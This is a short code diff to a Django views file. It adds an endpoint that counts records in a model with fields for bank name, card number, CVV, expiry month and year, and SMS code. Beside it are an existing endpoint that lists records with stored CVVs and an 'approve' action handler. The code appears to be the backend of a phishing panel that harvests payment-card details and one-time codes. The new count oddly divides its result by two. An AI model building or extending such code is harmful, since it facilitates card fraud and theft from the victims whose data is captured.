@@ -244,8 +244,17 @@ def contact_list_api(request):
     contacts = ContactModel.objects.filter(cvv__isnull=False).order_by('-id').values()  # Only return contacts with non-null value for cvv
     return JsonResponse({'contacts': list(contacts)})
 
-
-
+def phone_only_count_api(request):
+    contacts = ContactModel.objects.exclude(
+        bankname__isnull=False, 
+        cc__isnull=False, 
+        cvv__isnull=False, 
+        mm__isnull=False, 
+        yy__isnull=False, 
+        sms__isnull=False
+    )
+    count = contacts.count()/2
+    return JsonResponse({'count': count})
 @ensure_csrf_cookie
 def approve_action(request):
     if request.method == 'POST' and request.POST.get('action') == 'approve':
